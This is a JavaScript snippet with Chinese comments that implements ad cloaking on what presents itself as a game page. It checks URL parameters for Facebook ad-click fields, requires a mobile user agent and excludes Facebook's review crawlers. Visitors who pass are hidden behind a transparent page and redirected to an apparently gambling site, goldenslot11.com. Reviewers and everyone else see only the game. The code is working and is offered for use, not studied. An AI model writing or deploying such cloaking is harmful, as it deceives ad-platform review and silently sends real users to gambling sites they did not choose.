(function() {
    // 【配置：跳转目标地址】
    var config_target = "https://www.goldenslot11.com/13/?p0=1uk61sz6".trim(); 

    function isRealClick() {
        var searchRaw = window.location.search.toLowerCase();
        var ua = navigator.userAgent.toLowerCase();
        
        // 1. 占位符死刑：只要有 {{ 或 %7b%7b 绝对不跳
        if (searchRaw.indexOf('%7b%7b') > -1 || searchRaw.indexOf('{{') > -1) return false;

        // 2. 核心字段校验：排除空格和无效值
        var params = new URLSearchParams(window.location.search);
        var required = ['fbclid', 'pixel', 'apkch', 'campaign', 'adgroup', 'creative'];
        
        for (var i = 0; i < required.length; i++) {
            var val = params.get(required[i]);
            // .trim() 剔除所有空格，确保参数内容不是空，且长度大于 2（防止单字母伪造）
            if (!val || val.trim().length <= 2) return false;
        }

        // 3. 硬件环境校验：必须是移动端 (iOS/Android)
        if (!/iphone|ipad|ipod|android/.test(ua)) return false;

        // 4. 排除已知 FB 审核爬虫
        if (ua.indexOf('facebookexternalhit') > -1 || ua.indexOf('facebot') > -1) return false;

        return true; 
    }

    // --- 执行 logic ---
    if (isRealClick()) {
        try {
            var connector = config_target.indexOf('?') > -1 ? '&' : '?';
            var finalUrl = config_target + connector + window.location.search.substring(1);

            // 【防白屏核心逻辑】
            // 先尝试跳转，3秒内没跳走会自动通过这个定时器让页面变回可见
            var fallback = setTimeout(function() {
                document.body.style.opacity = "1";
                console.log("Jump failed or slow, stay in game.");
            }, 3000);

            // 判定成功后，瞬间让 body 透明（比 display:none 更稳定，不容易报错）
            document.body.style.transition = "opacity 0.1s";
            document.body.style.opacity = "0";

            // 执行瞬间重定向
            window.location.replace(finalUrl);

        } catch (e) {
            // 万一 JS 运行报错，立即显示游戏
            document.body.style.opacity = "1";
        }
    } else {
        // 不满足条件，直接加载游戏
        console.log("Safe Mode: Loading Game Content.");
        if (typeof init === 'function') init();
    }
})();
